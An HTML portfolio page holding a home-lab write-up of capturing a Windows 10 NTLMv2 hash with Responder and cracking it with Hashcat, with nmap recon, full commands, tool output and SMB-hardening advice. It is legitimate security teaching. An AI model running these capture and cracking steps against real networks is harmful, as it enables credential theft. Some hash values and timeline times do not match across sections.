<!-- Windows 10 SMB Hash Capture with Responder -->
<div class="detail-header">
  <a href="#" class="back-button">‚Üê Back to Portfolio</a>
  <h1>Windows 10 SMB Hash Capture & Cracking</h1>
  <p><span class="tag">Responder</span> <span class="tag">SMB</span> <span class="tag">NTLMv2</span> <span class="tag">Hashcat</span> <span class="tag">Windows 10</span> <span class="tag">Network Sniffing</span></p>
</div>

<div class="detail-content">
  <!-- Disclaimer -->
  <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
    <h3>‚ö†Ô∏è ETHICAL LAB TESTING DISCLAIMER</h3>
    <p><strong>This hash capture exercise was conducted in my isolated home lab environment.</strong> All testing was performed on systems I own and control. The goal was educational - to understand how SMB hash capture works and how to crack NTLMv2 hashes. Never attempt this on networks you don't own.</p>
  </div>

  <!-- üìã EXECUTIVE SUMMARY -->
  <div class="step">
    <h3>üìã Project Summary</h3>
    <p>This lab demonstrates a complete SMB hash capture and cracking chain on a Windows 10 target. The goal was to capture NTLMv2 hashes using Responder by tricking the Windows machine into authenticating to my attacker machine, then crack the captured hash with Hashcat to recover the plaintext password. The exercise highlights the dangers of SMB signing not being enforced.</p>
    
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem; margin: 1.5rem 0;">
      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; margin-bottom: 0.5rem;">üîç</div>
        <div><strong>Phase 1:</strong> Reconnaissance</div>
        <div style="font-size: 0.9rem; color: #9ca3af;">Nmap scan to identify open ports & SMB version</div>
      </div>
      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; margin-bottom: 0.5rem;">üì°</div>
        <div><strong>Phase 2:</strong> Responder Setup</div>
        <div style="font-size: 0.9rem; color: #9ca3af;">Starting Responder in analysis mode</div>
      </div>
      <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; margin-bottom: 0.5rem;">‚ö°</div>
        <div><strong>Phase 3:</strong> Hash Capture</div>
        <div style="font-size: 0.9rem; color: #9ca3af;">NTLMv2 hash captured via SMB</div>
      </div>
      <div style="background: rgba(245, 158, 11, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; margin-bottom: 0.5rem;">üîì</div>
        <div><strong>Phase 4:</strong> Hash Cracking</div>
        <div style="font-size: 0.9rem; color: #9ca3af;">Using Hashcat with rockyou.txt wordlist</div>
      </div>
      <div style="background: rgba(16, 185, 129, 0.1); padding: 1rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; margin-bottom: 0.5rem;">‚úÖ</div>
        <div><strong>Phase 5:</strong> Password Recovered</div>
        <div style="font-size: 0.9rem; color: #9ca3af;">Plaintext password obtained</div>
      </div>
    </div>

    <div style="margin-top: 1rem; padding: 1rem; background: rgba(16, 185, 129, 0.1); border-radius: 6px;">
      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1rem;">
        <div>
          <strong>üéØ Target:</strong> Windows 10 VM<br>
          <strong>üì° Target IP:</strong> 192.168.253.128<br>
          <strong>üë§ User:</strong> John doe
        </div>
        <div>
          <strong>üíª Attacker:</strong> Kali Linux<br>
          <strong>üåê Attacker IP:</strong> 192.168.253.130<br>
          <strong>üîì Hash Cracked:</strong> Yes (1 second)
        </div>
        <div>
          <strong>üõ°Ô∏è SMB Signing:</strong> Not enforced<br>
          <strong>üìä SMB Version:</strong> 3.1.1<br>
          <strong>üìÖ Date:</strong> Feb 13, 2026
        </div>
      </div>
    </div>
  </div>

  <!-- PHASE 1: Reconnaissance - Nmap Scan -->
  <div class="step">
    <h3>üîç Phase 1: Reconnaissance - Nmap Port Scan</h3>
    <p>First, I performed a full TCP port scan on the Windows 10 target to identify open ports and services, particularly focusing on SMB.</p>
    
    <div class="lab-image">
      <img src="../assets/images/nmap_port_scan full tcp range.JPG" alt="Nmap Full Port Scan Windows 10">
      <div class="lab-image-caption">üì∏ nmap_port_scan full tcp range.JPG - Full TCP port scan on Windows 10 target</div>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ nmap -Pn -sS -sV -p- 192.168.253.128</span><br>
      <br>
      Starting Nmap 7.98 at 2026-02-13 11:54 +0100<br>
      Nmap scan report for 192.168.253.128<br>
      Host is up (0.0050s latency).<br>
      Not shown: 65528 filtered tcp ports<br>
      <br>
      <span style="color: #f92672;">PORT      STATE SERVICE       VERSION</span><br>
      <span style="color: #f92672;">135/tcp   open  msrpc         Microsoft Windows RPC</span><br>
      <span style="color: #f92672; font-weight: bold;">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br>
      <span style="color: #f92672; font-weight: bold;">445/tcp   open  microsoft-ds  Microsoft Windows SMB</span><br>
      5040/tcp  open  unknown<br>
      5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)<br>
      7680/tcp  open  pando-pub?<br>
      49668/tcp open  msrpc         Microsoft Windows RPC<br>
      <br>
      MAC Address: 00:0C:29:2E:C0:6C (VMware)<br>
      Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
    </div>
    
    <p><strong>Key Finding:</strong> Ports 139 and 445 open - SMB services are accessible on the target.</p>
  </div>

  <!-- SMB Protocol Analysis -->
  <div class="step">
    <h3>üîß Phase 2: SMB Protocol Analysis</h3>
    <p>I used Nmap scripts to identify which SMB protocols are supported and check the security configuration.</p>
    
    <h4>SMB Protocols Supported:</h4>
    <div class="lab-image">
      <img src="../assets/images/smb_protocols.JPG" alt="SMB Protocols">
      <div class="lab-image-caption">üì∏ smb_protocols.JPG - SMB dialects supported on Windows 10</div>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ nmap -sS -p445 --script smb-protocols.nse 192.168.253.128</span><br>
      <br>
      Host script results:<br>
      | smb-protocols:<br>
      |   dialects:<br>
      |       2.0.2<br>
      |       2.1<br>
      |       3.0<br>
      |       3.0.2<br>
      |_      3.1.1<br>
      <br>
      <span style="color: #fd971f;">‚Üí Target supports SMB 3.1.1 (latest version)</span>
    </div>
    
    <h4 style="margin-top: 1.5rem;">SMB Security Mode:</h4>
    <div class="lab-image">
      <img src="../assets/images/smb_securtiy_mode.JPG" alt="SMB Security Mode">
      <div class="lab-image-caption">üì∏ smb_security_mode.JPG - SMB signing enabled but not enforced</div>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ nmap -sS -p445 --script smb2-security-mode.nse 192.168.253.128</span><br>
      <br>
      Host script results:<br>
      | smb2-security-mode:<br>
      |  3.1.1:<br>
      |_    <span style="color: #ef4444; font-weight: bold;">Message signing enabled but not required</span><br>
      <br>
      <span style="color: #fd971f;">‚Üí CRITICAL: SMB signing is NOT enforced - vulnerable to NTLM relay attacks</span>
    </div>
    
    <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
      <p><strong>‚ö†Ô∏è Critical Finding:</strong> SMB signing is enabled but NOT required. This means the Windows 10 machine will accept SMB connections without verifying signatures, making it vulnerable to NTLM hash capture and relay attacks.</p>
    </div>
  </div>

  <!-- PHASE 3: Responder - Hash Capture -->
  <div class="step">
    <h3>üì° Phase 3: Responder - Hash Capture</h3>
    <p>I launched Responder on my Kali machine to listen for SMB authentication attempts and capture NTLMv2 hashes.</p>
    
    <div class="lab-image">
      <img src="../assets/images/ntlmv2 hash.JPG" alt="NTLMv2 Hash Capture">
      <div class="lab-image-caption">üì∏ ntlmv2hash.JPG - Responder capturing NTLMv2 hash from Windows 10</div>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ sudo responder -I eth1 -wdvF</span><br>
      <br>
      <span style="color: #a6e22e;">                                         __</span><br>
      <span style="color: #a6e22e;">  .----.-----.-----.-----.-----.-----.  |  |</span><br>
      <span style="color: #a6e22e;">  |   _|  -__|     |  _  |  -__|     |  |__|</span><br>
      <span style="color: #a6e22e;">  |__| |_____|__|__|___  |_____|__|__|  |__|</span><br>
      <span style="color: #a6e22e;">                   |__|</span><br>
      <br>
      <span style="color: #a6e22e;">  NBT-NS, LLMNR & MDNS Responder 3.1.5.0</span><br>
      <br>
      [+] Listening on interfaces: eth1<br>
      [+] WPAD script loaded.<br>
      [+] Waiting for events...<br>
      <br>
      <span style="color: #fd971f;">[SMB] NTLMv2-SSP Client   : 192.168.253.128</span><br>
      <span style="color: #fd971f;">[SMB] NTLMv2-SSP Username : DESKTOP-RB4I4KI\John doe</span><br>
      <span style="color: #fd971f;">[SMB] NTLMv2-SSP Hash     : John doe::DESKTOP-RB4I4KI:cf78e953079268de:6DB5F0FB37D8D34A1ED149DDC017A818B76E83A00C4000000000000000000000000000000000000000000000000000000000000000000000000...[TRUNCATED]</span>
    </div>
  </div>

  <!-- PHASE 4: Saving the Hash -->
  <div class="step">
    <h3>üíæ Phase 4: Saving the Captured Hash</h3>
    <p>I saved the captured NTLMv2 hash to a file for cracking with Hashcat.</p>
    
    <div class="lab-image">
      <img src="../assets/images/saving ntlm hash to a file.JPG" alt="Saving NTLM Hash">
      <div class="lab-image-caption">üì∏ saving ntlm hash to a file.JPG - Saving captured hash to file for cracking</div>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ echo 'John doe::DESKTOP-RB4I4KI:cf78e953079268de:6DB5F0FB37D8D34A1ED149DDC017A818B76E83A00C4000000000000000000000000000000000000000...[TRUNCATED]' > john_doe_hash.txt</span>
    </div>
  </div>

  <!-- PHASE 5: Hashcat Cracking - Setup -->
  <div class="step">
    <h3>üîì Phase 5: Hashcat - Cracking the NTLMv2 Hash</h3>
    <p>I used Hashcat with the rockyou.txt wordlist to crack the captured NTLMv2 hash (mode 5600).</p>
    
    <div class="lab-image">
      <img src="../assets/images/hashcat1.JPG" alt="Hashcat Setup">
      <div class="lab-image-caption">üì∏ hashcat1.JPG - Hashcat starting with NTLMv2 hash mode 5600</div>
    </div>
    
    <div class="command-box">
      <span style="color: #66d9ef;">‚îå‚îÄ‚îÄ(samuel„âøsammi13)-[~]</span><br>
      <span style="color: #a6e22e;">‚îî‚îÄ$ hashcat -m 5600 ~/john_doe_hash.txt /usr/share/wordlists/rockyou.txt</span><br>
      <br>
      hashcat (v7.1.2) starting<br>
      <br>
      OpenCL API (OpenCL 3.0 PoC) - Platform #1 [The pocl project]<br>
      * Device #01: cpu-haswell-Intel(R) Core(TM) i7-7600U CPU @ 2.80GHz, 3150/6301 MB, 2MCU<br>
      <br>
      Minimum password length supported: 0<br>
      Maximum password length supported: 256<br>
      <br>
      Hashes: 1 digests; 1 unique digests, 1 unique salts<br>
      Bitmaps: 16 bits, 65536 entries<br>
      <br>
      Dictionary cache built:<br>
      * Filename: /usr/share/wordlists/rockyou.txt<br>
      * Passwords: 14,344,392<br>
      * Bytes: 139,921,507<br>
      * Keyspace: 14,344,385<br>
      * Runtime: 3 secs
    </div>
    
    <h4 style="margin-top: 2rem;">Hashcat - Successful Crack:</h4>
    
    <div class="lab-image">
      <img src="../assets/images/hashcat2.JPG" alt="Hashcat Successful Crack">
      <div class="lab-image-caption">üì∏ hashcat2.JPG - Hashcat successfully cracked the NTLMv2 hash</div>
    </div>
    
    <div class="command-box">
      <span style="color: #a6e22e;">JOHN_DOE::DESKTOP-RB4I4KI:cf78e953079268de:6db5f0fb37db03418d557f4fe6365b:0100000000000055324aed149ddc017a818b76f83a00c400000000020008033003100360058001001e00570049004e002d0031005a0045060049004b004804600320059004f000401...[TRUNCATED]</span><br>
      <br>
      <span style="color: #a6e22e; font-weight: bold;">Session...: hashcat</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Status...: Cracked</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Hash.Target...: 5600 (NetNTLMv2)</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Time.Started...: Fri Feb 13 19:41:21 2026 (1 sec)</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Time.Estimated...: Fri Feb 13 19:41:22 2026 (0 secs)</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Speed...: 216.9 kH/s</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Recovered...: 1/1 (100.00%) Hashes</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Progress...: 47104/14344385 (0.33%)</span><br>
      <br>
      <span style="color: #a6e22e;">Started: Fri Feb 13 19:40:16 2026</span><br>
      <span style="color: #a6e22e; font-weight: bold;">Stopped: Fri Feb 13 19:41:23 2026</span>
    </div>
    
    <h4 style="margin-top: 2rem;">Recovered Password:</h4>
    
    <div class="lab-image">
      <img src="../assets/images/hashcat3.JPG" alt="Hashcat Password Recovered">
      <div class="lab-image-caption">üì∏ hashcat3.JPG - Plaintext password recovered from NTLMv2 hash</div>
    </div>
    
    <div class="command-box" style="background: rgba(16, 185, 129, 0.1); border: 2px solid #10b981;">
      <span style="color: #a6e22e; font-size: 1.2rem; font-weight: bold;">‚úÖ PASSWORD RECOVERED: [JOHNDOE]</span><br>
      <br>
    </div>
  </div>

  <!-- Hash Capture Summary -->
  <div class="step">
    <h3>üìä Hash Capture Statistics</h3>
    
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 1rem; margin-top: 1rem;">
      <div style="background: rgba(59, 130, 246, 0.1); padding: 1.5rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; color: #3b82f6;">1</div>
        <div><strong>Hash Captured</strong></div>
        <div style="font-size: 0.9rem; color: #9ca3af;">NTLMv2 from SMB</div>
      </div>
      
      <div style="background: rgba(245, 158, 11, 0.1); padding: 1.5rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; color: #f59e0b;">1 sec</div>
        <div><strong>Cracking Time</strong></div>
        <div style="font-size: 0.9rem; color: #9ca3af;">With rockyou.txt wordlist</div>
      </div>
      
      <div style="background: rgba(16, 185, 129, 0.1); padding: 1.5rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; color: #10b981;">47,104</div>
        <div><strong>Attempts</strong></div>
        <div style="font-size: 0.9rem; color: #9ca3af;">Before successful crack</div>
      </div>
      
      <div style="background: rgba(139, 92, 246, 0.1); padding: 1.5rem; border-radius: 8px; text-align: center;">
        <div style="font-size: 2rem; color: #8b5cf6;">14.3M</div>
        <div><strong>Wordlist Size</strong></div>
        <div style="font-size: 0.9rem; color: #9ca3af;">rockyou.txt passwords</div>
      </div>
    </div>
  </div>

  <!-- Key Findings -->
  <div class="step">
    <h3>üîë Key Findings</h3>
    <ul style="list-style-type: none; padding: 0;">
      <li style="margin-bottom: 0.75rem;">‚úÖ <strong>SMB Signing Not Enforced:</strong> Windows 10 had SMB signing enabled but not required - critical misconfiguration</li>
      <li style="margin-bottom: 0.75rem;">‚úÖ <strong>Successful Hash Capture:</strong> Responder captured NTLMv2 hash when target attempted SMB authentication</li>
      <li style="margin-bottom: 0.75rem;">‚úÖ <strong>Fast Cracking:</strong> Hashcat cracked the password in under 1 second using rockyou.txt wordlist</li>
      <li style="margin-bottom: 0.75rem;">‚úÖ <strong>SMB 3.1.1:</strong> Target supports latest SMB protocol but security features not properly enforced</li>
      <li style="margin-bottom: 0.75rem;">‚úÖ <strong>Educational Value:</strong> Demonstrated complete attack chain from reconnaissance to password recovery</li>
    </ul>
  </div>

  <!-- Security Recommendations -->
  <div class="step">
    <h3>üõ°Ô∏è Security Recommendations</h3>
    
    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1rem; margin-top: 1rem;">
      <div style="background: rgba(239, 68, 68, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #ef4444;">
        <h4>Immediate Actions</h4>
        <ul style="list-style-type: none; padding: 0;">
          <li>‚úì <strong>Enforce SMB Signing:</strong> Set "Microsoft network server: Digitally sign communications (always)" to Enabled</li>
          <li>‚úì <strong>Disable SMBv1:</strong> Ensure only SMBv2/v3 are enabled</li>
          <li>‚úì <strong>Use Strong Passwords:</strong> Password cracked in 1 second - implement password complexity requirements</li>
        </ul>
      </div>
      
      <div style="background: rgba(59, 130, 246, 0.1); padding: 1rem; border-radius: 6px; border-left: 4px solid #3b82f6;">
        <h4>Defensive Measures</h4>
        <ul style="list-style-type: none; padding: 0;">
          <li>‚úì <strong>Network Segmentation:</strong> Isolate critical systems from potential attackers</li>
          <li>‚úì <strong>Monitor for Responder:</strong> Detect LLMNR/NBT-NS poisoning attacks</li>
          <li>‚úì <strong>Enable Windows Firewall:</strong> Block unnecessary SMB traffic from untrusted networks</li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Attack Timeline -->
  <div class="step">
    <h3>‚è±Ô∏è Attack Timeline</h3>
    <div style="margin: 1.5rem 0; padding: 1rem; background: rgba(0,0,0,0.2); border-radius: 6px;">
      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
        <div style="width: 100px; font-family: monospace; color: #3b82f6;">11:54:00</div>
        <div style="width: 20px; height: 20px; background: #3b82f6; border-radius: 50%; margin-right: 1rem;"></div>
        <div><strong>Initial Nmap scan</strong> - Full TCP port scan on Windows 10 target</div>
      </div>
      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
        <div style="width: 100px; font-family: monospace; color: #3b82f6;">12:37:00</div>
        <div style="width: 20px; height: 20px; background: #3b82f6; border-radius: 50%; margin-right: 1rem;"></div>
        <div><strong>SMB protocol analysis</strong> - Identified SMB 3.1.1 with signing not enforced</div>
      </div>
      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
        <div style="width: 100px; font-family: monospace; color: #f59e0b;">19:40:16</div>
        <div style="width: 20px; height: 20px; background: #f59e0b; border-radius: 50%; margin-right: 1rem;"></div>
        <div><strong>Responder started</strong> - Listening for SMB authentication attempts</div>
      </div>
      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
        <div style="width: 100px; font-family: monospace; color: #ef4444;">19:41:21</div>
        <div style="width: 20px; height: 20px; background: #ef4444; border-radius: 50%; margin-right: 1rem;"></div>
        <div><strong>Hash captured</strong> - NTLMv2 hash from Windows 10 target</div>
      </div>
      <div style="display: flex; align-items: center; margin-bottom: 1rem;">
        <div style="width: 100px; font-family: monospace; color: #10b981;">19:41:22</div>
        <div style="width: 20px; height: 20px; background: #10b981; border-radius: 50%; margin-right: 1rem;"></div>
        <div><strong>Hash cracked</strong> - Password recovered in 1 second</div>
      </div>
    </div>
  </div>

  <!-- Conclusion -->
  <div class="step">
    <h3>üìù Conclusion</h3>
    <p>This exercise successfully demonstrated the complete SMB hash capture and cracking chain on a Windows 10 target. The key vulnerability was SMB signing being enabled but not enforced, which allowed Responder to capture the NTLMv2 hash when the target attempted authentication. The password was cracked in under 1 second using Hashcat with the rockyou.txt wordlist, highlighting the critical importance of strong passwords and proper SMB security configuration.</p>
    
    <div class="note" style="background: rgba(239, 68, 68, 0.1); border-left-color: #ef4444;">
      <p><strong>‚ö†Ô∏è Critical Takeaway:</strong> SMB signing must be enforced, not just enabled. Weak passwords can be cracked in seconds, and misconfigured SMB settings can lead to credential compromise. Always use strong passwords and ensure security features are properly enforced, not just available.</p>
    </div>
    
    <p style="margin-top: 1rem;"><strong>Assessment completed by:</strong> Samuel Ifeoluwa Oshunsan<br>
    <strong>Environment:</strong> Isolated home lab - Windows 10 VM and Kali Linux<br>
    <strong>Date:</strong> February 13, 2026</p>
    
    <p style="margin-top: 1rem; font-size: 0.9rem; color: #9ca3af;">
      <em>This assessment was conducted for educational purposes in a controlled lab environment. The techniques demonstrated should only be used on systems you own or have explicit permission to test.</em>
    </p>
  </div>
</div>